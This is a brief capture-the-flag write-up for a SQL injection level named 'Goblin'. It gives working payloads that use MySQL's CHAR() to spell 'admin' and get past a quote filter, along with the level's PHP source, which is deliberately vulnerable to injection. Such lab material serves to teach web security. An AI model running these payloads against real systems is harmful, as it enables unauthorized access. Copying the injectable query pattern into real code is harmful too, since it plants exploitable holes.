# Lvl Goblin

### **Vulnerability**

Numeric injection with quote filtering

### **Way to do it**

Use CHAR() function or hex values to bypass quote restriction

### **Restrictions**

- Filters quotes (**`'`**, **`"`**, **```**)
- Hardcoded id='guest' in query

### **Bypass Methods**

```
?no=0 or id = char(97,100,109,105,110)
or
?no=0 or id like char(97,100,109,105,110)
```

### **Important Notes**

> "I can't use first id which is defined as user coz it's hardcoded... I used ASCII values and CHAR function to give the admin name or I can even use hex values of admin instead of ASCII."
> 

### **Level Code**

```
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__);
?>
```